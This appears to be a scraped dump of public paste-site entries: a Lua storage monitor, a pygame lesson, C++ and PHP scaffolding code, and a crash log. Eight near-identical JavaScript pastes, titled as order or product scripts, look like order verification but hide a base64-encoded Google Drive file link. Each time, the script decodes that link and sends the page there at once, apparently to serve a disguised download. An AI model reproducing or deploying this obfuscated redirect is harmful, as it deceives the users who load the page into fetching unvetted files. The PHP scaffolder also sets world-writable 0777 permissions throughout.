    local dif = math.floor(monX-length)
    local x = math.floor(dif/2)
    if pos == ""head"" then
        mon.setCursorPos(x+1, line)
        mon.write(text)
    elseif pos == ""left"" then
        mon.setCursorPos(2,line)
        mon.write(text)
    elseif pos == ""right"" then
        mon.setCursorPos(monX-length, line)
        mon.write(text)
    end
end
local function sort(a,b)
    return a.amount>b.amount
end
local function swap(tab, firstindex,secondindex)
    local temp=tab[firstindex]
    tab[firstindex]=tab[secondindex]
    tab[secondindex]=temp
end
local function partition(tab,left,right)
    local pivv=tab[right]
    local partitionindex=left
    for i=left,right-1 do
        if tab[i].amount<pivv.amount then
            swap(tab,i,partitionindex)
            partitionindex=partitionindex+1
        end
    end
    swap(tab, right, partitionindex)
    return partitionindex
end

local function quicksort(tab,left,right)
    left=left or 1
    right=right or #tab
    if left >=right then
        return
    end
    local pivi=partition(tab,left,right)
    quicksort(tab,left,pivi-1)
    quicksort(tab,pivi+1,right)
    return tab
end

local allitems=me.listItems()
local allfuilds=me.listFluid()
while true do
    sleep(3)
    local itemcount=me.getUsedItemStorage()
    local fluidcount=me.getUsedFluidStorage()
    allitems=me.listItems()
    allfuilds=me.listFluid()
    if itemrows>0 then
        quicksort(allitems)
    end
    if fluidrows>0 then
        quicksort(allfuilds)
    end
    --table.sort(allitems,sort)
    --table.sort(allfuilds,sort)
    if #allitems==0 then
        for i=1,itemrows,1 do
            allitems[i]={amount=0,name=""minecraft:air"",displayName=""air"",nbt={}}
        end
    end
    if #allfuilds==0 then
        for i=1,fluidrows,1 do
            allfuilds[i]={amount=0,name=""minecraft:air"",displayName=""air""}
        end
    end
    mon.clear()
    for i=1,itemrows,1 do
        local v=allitems[i]
        CenterT(v.displayName ,i+6, colors.black, colors.lightGray,""left"")
        CenterT(tostring(v.amount) ,i+6, colors.black, colors.lightGray,""right"")
    end
    for i=1,fluidrows,1 do
        local v=allfuilds[i]
        if v==nil then
            v={}
            v.displayName=""air""
            v.amount=0
        end
        CenterT(v.displayName ,i+7+itemrows, colors.black, colors.lightGray,""left"")
        CenterT(tostring(v.amount)..""mb"" ,i+7+itemrows, colors.black, colors.lightGray,""right"")
    end
    local maxeng=tonumber(me.getMaxEnergyStorage())*2
    local engstor=tonumber(me.getEnergyStorage())*2
    local enguse=tonumber(me.getEnergyUsage())*2
    CenterT(""ME Storage Monitor v0.2 by dengmahal"" ,1, colors.black, colors.lightGray,""head"")
    CenterT(""Energy: ""..math.floor(engstor/10000)/100 ..""MFE/""..math.floor(maxeng/10000)/100 ..""MFE"" ,2, colors.black, colors.lightBlue,""left"")
    CenterT(math.floor(enguse/10)/100 ..""KFE/t"" ,3, colors.black, colors.lightBlue,""right"")
    CenterT(""Items: ""..itemcount..""/""..me.getTotalItemStorage(),4,colors.black,colors.white,""left"")
    CenterT(""Fluids: ""..fluidcount..""mb/""..me.getTotalFluidStorage()..""mb"",5, colors.black, colors.blue,""left"")
end"
t7gpJVqV,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 12:09:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24795/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
q2tR5cgR,Lesson 7 - Dynamic Camera,MCreeper12731,Python,Thursday 10th of April 2025 12:06:14 PM CDT,"import random
import pygame
pygame.init()
pygame.font.init()

font = pygame.font.SysFont(""Times New Roman"", 30)

WIDTH = 1200
HEIGHT = 600
window = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Coin:
    def __init__(self, x, y):
        self.position = pygame.Rect(x, y, 50, 42)
        self.image = pygame.transform.scale(pygame.image.load(""images/cheeseburger.png""), (50, 42))

    def collect(self, player):
        player.score += 1

    def draw(self, player):
        x_relative = self.position.x - (player.position.x - player.x_relative)
        y_relative = self.position.y - (player.position.y - player.y_relative)

        window.blit(self.image, (x_relative, y_relative))

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.jumps = 3
        self.score = 0
        self.direction = 0
        self.x_relative = (WIDTH - self.size) // 2
        self.y_relative = 3 * (HEIGHT - self.size) // 4
    
    def move(self):
        keys = pygame.key.get_pressed()
        if keys[pygame.K_d]:
            self.speed_x = 5
            self.direction = 1
        elif keys[pygame.K_a]:
            self.speed_x = -5
            self.direction = -1
        else:
            self.speed_x = 0

        if keys[pygame.K_SPACE] and self.jumps > 0 and self.speed_y > -5:
            self.jumps -= 1
            self.speed_y = -18

        if self.speed_y < 20:
            self.speed_y += 1

        self.position.x += self.speed_x
        self.position.y += self.speed_y

        # if self.position.x < 0:
        #     self.position.x = 0
        # if self.position.x > WIDTH - self.size:
        #     self.position.x = WIDTH - self.size
        # if self.position.y < 0:
        #     self.position.y = 0
        # if self.position.y > HEIGHT - self.size:
        #     self.position.y = HEIGHT - self.size
        
        for platform in platforms:
            if self.position.colliderect(platform.position):
                resolve_collision(self.position, platform.position)

    def draw(self):
        if (player.direction < 0):
            window.blit(pygame.transform.flip(player.image, True, False), (self.x_relative, self.y_relative))
        else:
            window.blit(self.image, (self.x_relative, self.y_relative))
        

class Platform:
    def __init__(self, x, y, width, height):
        self.position = pygame.Rect(x, y, width, height)

    def draw(self, player):
        x_relative = self.position.x - (player.position.x - player.x_relative)
        y_relative = self.position.y - (player.position.y - player.y_relative)
        
        pygame.draw.rect(window, (0, 127, 0), pygame.Rect(x_relative, y_relative, self.position.width, self.position.height))

        

player = Player(100, 100)

platforms = [Platform(0, HEIGHT - 50, WIDTH, 50), Platform(300, 500, 200, 20), Platform(600, 350, 200, 20), Platform(900, 400, 200, 20)]

coins = [Coin(400, 150), Coin(600, 200), Coin(900, 300)]
# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            pass
            # player.speed_y = 0
            # rect_a.y += dy1  # Move down
        else:
            player.jumps = 3
            player.speed_y = 0
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((0, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili

    player.move()

    for coin in coins:
        if player.position.colliderect(coin.position):
            coin.collect(player)
            coins.remove(coin)

    # ---
    # Izris likov
    # ---

    player.draw()

    font_render = font.render(f""Score: {player.score}"", False, (0, 0, 0))
    window.blit(font_render, (0, 0))
    
    for platform in platforms:
        platform.draw(player)

    for coin in coins:
        coin.draw(player)
        # window.blit(slika_ovire, platform)

    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
vuDzbazX,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 11:53:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28108/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TUTU5Eaa,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 11:38:25 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/25069/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
e6iMT4ys,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 11:23:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67223/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nDF23psz,Products.js,luqlegal,JavaScript,Thursday 10th of April 2025 11:07:39 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16024/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VPGLnmfD,Order.js,luqlegal,JavaScript,Thursday 10th of April 2025 10:51:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/22241/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0cYbRuTL,Market.js,luqlegal,JavaScript,Thursday 10th of April 2025 10:36:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39599/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
94tVpZC8,2025-04-10T17:32:58.749135,powerampache,PHP,Thursday 10th of April 2025 10:32:56 AM CDT,"1.01-79 (79) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.NullSessionException: Session is NULL
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.authToken(BaseAmpacheRepository.kt:87)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$authToken$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:991)
	at android.os.Handler.dispatchMessage(Handler.java:102)
	at android.os.Looper.loopOnce(Looper.java:232)
	at android.os.Looper.loop(Looper.java:317)
	at android.app.ActivityThread.main(ActivityThread.java:8973)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:591)
	at com.android.internal.os.ExecInit.main(ExecInit.java:50)
	at com.android.internal.os.RuntimeInit.nativeFinishInit(Native Method)
	at com.android.internal.os.RuntimeInit.main(RuntimeInit.java:369)

scrobble() - generic exception {""detailMessage"":""Session is NULL"",""stackTrace"":[],""suppressedExceptions"":[]}"
W41tZV1a,Untitled,luqlegal,JavaScript,Thursday 10th of April 2025 10:20:43 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64775/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cLrEuxGS,Untitled,DaniDori,C++,Thursday 10th of April 2025 10:19:48 AM CDT,"#include <iostream>
#include <stdio.h>
using namespace std;
int f(int q, int *ar, int n){
    int l=0,r=n-1,m=n/2;
    while (l<r){
        if(q>=ar[m] and q<=ar[m+1]) return m;
        if(q<ar[m]){
            l=m;
            m=(r-l)/2;
        }
        else{
            r=m;
            m=(r-l)/2;
        }
    }
    return m;
}
int main() {
	int n, a,b=0,m;
	cin>>n;
	int *ar=new int[n];
	for(int i=0;i<n;i++){
	    cin>>a;
	    if (i == 0)
	        ar[i]=a;
	    else
	        ar[i]=a+ar[i-1];
	}
	int q;
	cin>>m;
	for(int i=0;i<m;i++){
        cin>>q;
	    cout<<f(q, ar, n)<<'\n';
	}
}
"
UqG6iNPD,CVManager - Project Manager - Vinicius Cordeiro,ViniCordeiroX,PHP,Thursday 10th of April 2025 10:18:11 AM CDT,"<?php

/**
 * 
 * CV Manager - File to create a new project, like laravel artisan  but for simple structure project
 * 
 * @author Vinícius Cordeiro <vinicordeirogo@gmail.com>
 * @version 1.0.0
 * @copyright 2025 Vinícius Cordeiro
 */

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

error_reporting(E_ERROR | E_WARNING | E_PARSE);

// Increase the memory limit
ini_set('memory_limit', '-1');
// Set the maximum execution time
set_time_limit(0);

$files = [
	'app' => [
		'Core' => [
			'Controller.php',
			'Middleware.php',
			'Request.php',
			'Api.php',
			'Auth.php',
			'Cookie.php',
			'Session.php',
			'Tests.php',
		],
		'Controllers' => [
			'HomeController.php',
			'LoginController.php',
			'RegisterController.php',
			'UserController.php',
			'ErrorController.php',
			'ExampleController.php'
		],
		'Models' => [
			'Model.php',
		],
		'Views' => [
			'View.php',
		],
		'Helpers' => [
			'Helper.php',
		],
		'bootstrap.php',
		'functions.php',
	],
	'config' => [
		'app.config.php',
		'database.config.php',
		'errors.config.php',
		'types.config.php',
		'version.config.php',
		'session.config.php',
	],
	'libs' => [
		'autoload.php',
	],
	'storage' => [
		'logs' => [
			'debug.log',
		],
		'sessions' => [],
		'uploads' => [
			'images' => [],
			'files' => [],
			'avatars' => [],
		]
	],
	'routes' => [
		'base.php',
		'web.php'
	],
	'tests' => [
		'debug' => [
			'showVersion.php',
		]
	],
	'resources' => [
		'css' => [
			'app.css',
		],
		'js' => [
			'app.js',
			'home/' => [
				'app.js'
			],
			'example/' => [
				'app.js'
			]
		],
		'images' => [],
		'fonts' => [],
		'views' => [
			'layouts' => [
				'guest.tpl',
				'admin.tpl',
				'error.tpl',
			],
			'components' => [
				'menu.tpl',
				'header.tpl',
				'footer.tpl'
			],
			'errors' => [
				'404.tpl',
				'500.tpl',
				'403.tpl'
			],
		]
	],
	'/' => [
		'index.php',
		'README.md',
		'composer.json',
		'.gitignore',
		'favicon.ico',
		'LICENSE',
		'tailwind.config.js',
	],
];

// Ask if the user want to give a name to the project
echo 'Please enter the name of the project: ';
$project_name = trim(fgets(STDIN));

// Do not allow the user to give an empty name
if ($project_name == '') {
	echo 'Please enter a name for the project, it cannot be empty.' . PHP_EOL . 'Exiting...' . PHP_EOL;
	exit;
}

// Ask if the user want to set the author of the project
echo 'Please enter the author of the project: ';
if (strtolower($author = trim(fgets(STDIN))) == 'y') {
	// Ask for the name of the project
	echo 'Enter the author of the project: ';
	$author = trim(fgets(STDIN));
}

// Do not allow the user to give an empty name
if ($author == '') {
	echo 'Please enter an author for the project, it cannot be empty.' . PHP_EOL . 'Exiting...' . PHP_EOL;
	exit;
}

// Create the root folder
mkdir($project_name, 0777, true);
// Create icon with the initials of the project name
$icon = strtoupper(substr($project_name, 0, 4));
// using Imagick
$imagick = new Imagick();
$imagick->newImage(32, 32, new ImagickPixel('transparent'));
$draw = new ImagickDraw();
$draw->setFillColor(new ImagickPixel('black'));
$draw->setFontSize(18);
$draw->setTextAlignment(Imagick::ALIGN_CENTER);
$draw->setTextKerning(0);
$draw->setStrokeColor(new ImagickPixel('white'));
$draw->setStrokeWidth(2);
$draw->setGravity(Imagick::GRAVITY_CENTER);
$imagick->annotateImage($draw, 16, 16, 0, $icon);
$imagick->setImageFormat('ico');
$imagick->writeImage($project_name . '/favicon.ico');
$imagick->clear();


mkdir($project_name . '/resources/images/', 0777, true);
// Create icon with the initials of the project name
$icon = strtoupper(substr($project_name, 0, 4));
// using Imagick
$imagick = new Imagick();
$imagick->newImage(64, 64, new ImagickPixel('purple'));
$draw = new ImagickDraw();
$draw->setFillColor(new ImagickPixel('black'));
$draw->setFontSize(16);
$draw->setTextAlignment(Imagick::ALIGN_CENTER);
$draw->setTextKerning(0);
$draw->setStrokeColor(new ImagickPixel('white'));
$draw->setStrokeWidth(2);
$draw->setGravity(Imagick::GRAVITY_CENTER);
$imagick->annotateImage($draw, 24, 24, 0, $icon);
$imagick->setImageFormat('png');
$imagick->writeImage($project_name . '/resources/images/' . '/logo.png');
$imagick->clear();


// Ask if the user want to give a description to the project
echo 'Enter the description to the project: [default is empty] ';
$project_description = trim(fgets(STDIN));

// Ask if the user want to set the Keywords of the project
echo 'Enter the keywords of the project: [separated by commas, default is empty] ';
$keywords = trim(fgets(STDIN));

$project_version = ""1.0.0"";

// Ask if the user want to give a description to the project
echo 'Enter the version to the project? [default is 1.0.0] ';
$project_version = trim(fgets(STDIN));

// Get the email from the author, between the < and >
$authorNameWithoutEmail = preg_replace(""/<(.*)>/"", """", $author);

$startFile = ""<?php 
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file [file]
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" "" . $authorNameWithoutEmail . ""
 */"";

// Get the Root folder parameter passed on the command line if not specified use the project name on the current directory of the script
$root = $project_name && $project_name != '' ? $project_name : '/var/www/html/';

$errors = [];

function createFolderStructure($array, $rootFolder, $startFile = """") {
	foreach ($array as $key => $value) {
		$path = $rootFolder . DIRECTORY_SEPARATOR . $key;
		if (is_array($value)) {
			if (!is_dir($path)) {
				mkdir($path, 0777, true);
			}
			createFolderStructure($value, $path, $startFile); // recursive call
		} else {
			$filePath = $rootFolder . DIRECTORY_SEPARATOR . $value;
			if (!file_exists($filePath)) {
				// Check if the file it's a php file by chekcing
				if (!file_put_contents($filePath, '')) { // create empty file
					$errors[] = [
						'error' => 'Failed to create file ' . $filePath,
						'folder' => $rootFolder,
						'file' => $value
					];
				}
				echo $filePath . PHP_EOL;

				if (pathinfo($filePath, PATHINFO_EXTENSION) == 'php') {
					file_put_contents($filePath, str_replace('[file]', $value, $startFile));
				}
				// chmod the file
				if (!chmod($filePath, 0777)) {
					$errors[] = [
						'error' => 'Failed to change permission of file ' . $filePath,
						'folder' => $rootFolder,
						'file' => $value,
					];
				}
			}
		}
	}
}

$rootFolder = $root;
createFolderStructure($files, $rootFolder, $startFile);

// Populate the app.config.php with the template app.config.php
if (file_exists($root . '/config/' . 'app.config.php')) {
	$appConfig = ""
<?php
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file app.config.php
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" $author
 */
return [
	'name' => 'CV Manager',
	'debug' => 1,
	'url' => 'http://localhost/',
	'path' => '/var/www/cvmanager.com',
	'timezone' => 'America/Sao_Paulo',
	'locale' => 'pt-BR',
	'default_locale' => 'pt-BR',
	'default_timezone' => 'America/Sao_Paulo',
	'app_namespace' => 'App',
	'resources' => '/resources',
	'css' => '/resources/css',
	'js' => '/resources/js',
	'views' => '/resources/views',
	'libs' => '/libs',
	'images' => '/resources/images',
	'fonts' => '/resources/fonts',
	'js' => '/resources/js',
	'config' => '/config',
	'routes' => '/routes',
];"";


	file_put_contents($root . '/config/' . 'app.config.php', $appConfig);

	chmod($root . '/' . 'app.config.php', 0777);
}

// Populate the version.config.php 
if (file_exists($root . '/config/' . 'version.config.php')) {
	$versionConfig = ""
<?php
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file version.config.php
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" $author
 */
return [
	'current' => '1.0.0',
	'next' => '1.0.1',
	'last' => '1.0.0',
	'js' => '1.0.0',
	'css' => '1.0.0',
	'app' => '1.0.0',
];"";

	file_put_contents($root . '/config/' . 'version.config.php', $versionConfig);

	chmod($root . '/' . 'version.config.php', 0777);
}

// Populate the smtp.config.php with the template smtp.config.php
if (file_exists($root . '/config/' . 'smtp.config.php')) {
	$smtpConfig = ""
<?php
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file smtp.config.php
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" $author
 */
return [
	'host' => 'smtp.gmail.com',
	'port' => 587,
	'encryption' => 'tls',
	'username' => 'vinicordeirogo',
	'password' => 'password',
	'from' => 'vinicordeirogo',
	'from_name' => 'Vinícius Cordeiro',
];"";

	file_put_contents($root . '/config/' . 'smtp.config.php', $smtpConfig);

	chmod($root . '/' . 'smtp.config.php', 0777);
}


// Populate the types.config.php with the template types.config.php
if (file_exists($root . '/config/' . 'types.config.php')) {
	$typesConfig = "" <?php
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file types.config.php
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" $author
 */

namespace Config;

 enum Method : string {
	case GET = 'GET';
	case POST = 'POST';
	case PUT = 'PUT';
	case PATCH = 'PATCH';
	case DELETE = 'DELETE';
 }
 enum Role : string {
	case ADMIN = 'ADMIN';
	case USER = 'USER';
 }
 enum Status : string {
	case ACTIVE = 'ACTIVE';
	case INACTIVE = 'INACTIVE';
 }
 
 "";

	file_put_contents($root . '/config/' . 'types.config.php', $typesConfig);

	chmod($root . '/' . 'types.config.php', 0777);
}

// Populate the errors.config.php with the template errors.config.php
if (file_exists($root . '/config/' . 'errors.config.php')) {
	$errorsConfig = ""<?php
/**
 * "" . $project_name . ""
 * "" . $project_description . ""
 * @file errors.config.php
 * @package cvmanager
 * @author $author
 * @version "" . $project_version . ""
 * @copyright "" . date('Y') . "" $author
 */

return [
	'404' => [
		'title' => 'Page not found',
		'message' => 'The page you are looking for was not found.',
		'code' => 404,
	],
	'403' => [
		'title' => 'Forbidden',
		'message' => 'You do not have permission to access this page.',
		'code' => 403,
	],
	'500' => [
		'title' => 'Internal Server Error',
		'message' => 'An error occurred on the server.',
		'code' => 500,
	],
	'401' => [
		'title' => 'Unauthorized',
		'message' => 'You are not authorized to access this page.',
		'code' => 401,
	],
	'400' => [
		'title' => 'Bad Request',
		'message' => 'The request was invalid.',
		'code' => 400,
	],
	'409' => [
		'title' => 'Conflict',
		'message' => 'The request could not be completed due to a conflict.',
		'code' => 409,
	],
	'422' => [
		'title' => 'Unprocessable Entity',
		'message' => 'The request was valid, but the server was unable to process it.',
		'code' => 422,
	],
	'429' => [
		'title' => 'Too Many Requests',
		'message' => 'The user has made too many requests in a given amount of time.',
		'code' => 429,
	],
	'503' => [
		'title' => 'Service Unavailable',
		'message' => 'The server is currently unable to handle the request.',
		'code' => 503,
	],
];"";

	file_put_contents($root . '/config/' . 'errors.config.php', $errorsConfig);

	chmod($root . '/' . 'errors.config.php', 0777);
}

if (file_exists($root . '/app/' . 'functions.php')) {
	// Populate the functions.php with the template functions.php
	$functions = """" . str_replace('[file]', 'functions.php', $startFile) . ""
	function config(\$key) {
			
